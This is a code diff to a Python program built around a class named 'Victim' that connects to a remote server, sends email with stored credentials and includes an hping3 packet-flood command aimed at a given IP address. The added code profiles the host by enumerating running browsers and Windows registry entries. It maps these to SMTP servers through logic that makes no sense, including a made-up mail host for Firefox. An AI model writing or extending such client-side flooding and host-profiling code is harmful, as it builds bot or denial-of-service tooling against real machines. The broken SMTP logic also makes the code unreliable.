@@ -12,6 +12,7 @@ import time
 import psutil
 import subprocess
 import ast
+import winreg
 
 class EmailSender:
     def __init__(self, smtp_server, smtp_port, username, password):
@@ -58,6 +59,7 @@ class Victim:
 
     def connect_to_server(self):
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
         print("Msg: Client Initiated...")
         self.client.connect((self.server_ip, self.server_port))
         print("Msg: Connection initiated...")
@@ -91,9 +93,7 @@ class Victim:
             print("Please set the email address and password before sending the email.")
             return
 
-        # Email configuration
-        smtp_server = 'smtp.example.com'
-        smtp_port = 587
+        smtp_server, smtp_port = self.get_smtp_server_info()
 
         email_sender = EmailSender(smtp_server, smtp_port, self.email_address, self.password)
 
@@ -152,6 +152,45 @@ class Victim:
     def send_packets(self, ip_address):
         hping_command = f"hping3 {ip_address} -d 65535 -c 0"
         process = subprocess.Popen(hping_command, shell=True)
+
+    def get_smtp_server_info(self):
+        browsers = {
+            "chrome": {"smtp_server": "smtp.gmail.com", "smtp_port": 587},
+            "firefox": {"smtp_server": "smtp.mozilla.org", "smtp_port": 587},
+            "safari": {"smtp_server": "smtp.apple.com", "smtp_port": 587},
+            "opera": {"smtp_server": "smtp.opera.com", "smtp_port": 587}
+        }
+
+        detected_browsers = self.detect_browsers()
+
+        for browser_name in detected_browsers:
+            if browser_name.lower() in browsers:
+                return browsers[browser_name.lower()]["smtp_server"], browsers[browser_name.lower()]["smtp_port"]
+
+        # Default SMTP server information if browser detection fails
+        return "smtp.example.com", 587
+
+    def detect_browsers(self):
+        detected_browsers = []
+
+        # Check running processes for known browser names
+        for proc in psutil.process_iter(['name']):
+            process_name = proc.info['name'].lower()
+            if process_name in ['chrome.exe', 'firefox.exe', 'safari.exe', 'opera.exe']:
+                browser_name = os.path.splitext(process_name)[0]
+                detected_browsers.append(browser_name)
+
+        # Check Windows registry for browser information
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as start_menu_key:
+                num_subkeys = winreg.QueryInfoKey(start_menu_key)[0]
+                for i in range(num_subkeys):
+                    subkey_name = winreg.EnumKey(start_menu_key, i)
+                    detected_browsers.append(subkey_name)
+        except OSError:
+            pass
+
+        return detected_browsers
 
 
 if __name__ == '__main__':
